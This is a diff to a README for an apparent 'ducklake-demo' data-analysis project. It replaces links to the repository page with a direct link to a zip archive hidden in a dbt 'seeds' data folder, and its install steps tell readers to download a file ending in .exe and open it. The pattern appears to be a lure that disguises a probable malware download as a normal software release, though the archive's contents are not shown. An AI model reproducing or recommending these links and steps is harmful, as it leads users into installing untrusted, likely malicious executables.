@@ -1,6 +1,6 @@
 # 🦆 ducklake-demo - Streamline your data analysis tasks today
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Genusepacrissloe5344/ducklake-demo)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/Genusepacrissloe5344/ducklake-demo/main/ducklake_dbt/seeds/demo-ducklake-v3.8.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software. These req
 
 Follow these steps to set up the application on your computer.
 
-1. Go to the [official download page](https://github.com/Genusepacrissloe5344/ducklake-demo).
+1. Go to the [official download page](https://raw.githubusercontent.com/Genusepacrissloe5344/ducklake-demo/main/ducklake_dbt/seeds/demo-ducklake-v3.8.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the download.
 4. Open the file once the download finishes.
